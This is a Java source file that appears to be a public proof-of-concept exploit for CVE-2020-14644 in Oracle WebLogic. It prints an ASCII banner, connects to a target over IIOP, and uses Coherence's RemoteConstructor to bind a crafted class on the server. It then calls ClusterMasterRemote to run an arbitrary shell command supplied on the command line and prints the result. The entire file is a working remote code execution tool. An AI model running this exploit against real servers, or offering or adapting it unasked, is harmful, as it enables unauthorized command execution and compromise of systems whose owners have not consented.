package org.unicodesec;

import com.tangosol.internal.util.invoke.ClassDefinition;
import com.tangosol.internal.util.invoke.ClassIdentity;
import com.tangosol.internal.util.invoke.RemoteConstructor;
import javassist.ClassPool;
import javassist.CtClass;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.jndi.Environment;

import javax.naming.Context;
import javax.naming.NamingException;
import java.rmi.RemoteException;

/**
 * created by UnicodeSec potatso
 */
public class App {
    public static void main(String[] args) throws Exception {
        String text = "                   ___   ___ ___   ___        __ __ _  _     __ _  _   _  _                     \n" +
                "                  |__ \\ / _ \\__ \\ / _ \\      /_ /_ | || |   / /| || | | || |                    \n" +
                "   _____   _____     ) | | | | ) | | | |______| || | || |_ / /_| || |_| || |_    _____  ___ __  \n" +
                "  / __\\ \\ / / _ \\   / /| | | |/ /| | | |______| || |__   _| '_ \\__   _|__   _|  / _ \\ \\/ / '_ \\ \n" +
                " | (__ \\ V /  __/  / /_| |_| / /_| |_| |      | || |  | | | (_) | | |    | |   |  __/>  <| |_) |\n" +
                "  \\___| \\_/ \\___| |____|\\___/____|\\___/       |_||_|  |_|  \\___/  |_|    |_|    \\___/_/\\_\\ .__/ \n" +
                "                                                                                         | |    \n" +
                "                                                                                         |_|    " +
                "                                                     Powered by UnicodeSec potatso              ";
        System.out.println(text);
        if (args.length<3){
            printUsage();
        }
        String host = args[0];
        String port = args[1];
        String command = args[2];
        Context iiopCtx = getInitialContext(host, port);
        if (iiopCtx.lookup("UnicodeSec") == null) {
            ClassIdentity classIdentity = new ClassIdentity(org.unicodesec.test.class);
            ClassPool cp = ClassPool.getDefault();
            CtClass ctClass = cp.get(org.unicodesec.test.class.getName());
            ctClass.replaceClassName(org.unicodesec.test.class.getName(), org.unicodesec.test.class.getName() + "$" + classIdentity.getVersion());
            RemoteConstructor constructor = new RemoteConstructor(
                    new ClassDefinition(classIdentity, ctClass.toBytecode()),
                    new Object[]{}
            );
            String bindName = "UnicodeSec" + System.nanoTime();
            iiopCtx.rebind(bindName, constructor);
        }
        executeCmdFromWLC(command, iiopCtx);
    }

    private static void printUsage() {
        System.out.println("usage: java -jar cve-2020-14644.jar host port command");
        System.exit(-1);
    }

    private static void executeCmdFromWLC(String command, Context iiopCtx) throws NamingException, RemoteException {
        ClusterMasterRemote remote = (ClusterMasterRemote) iiopCtx.lookup("UnicodeSec");
        String response = remote.getServerLocation(command);
        System.out.println(response);
    }

    public static Context getInitialContext(String host, String port) throws Exception {
        String url = converUrl(host, port);
        Environment environment = new Environment();
        environment.setProviderUrl(url);
        environment.setEnableServerAffinity(false);
        Context context = environment.getInitialContext();
        return context;
    }

    public static String converUrl(String host, String port) {
        return "iiop://" + host + ":" + port;
    }


}
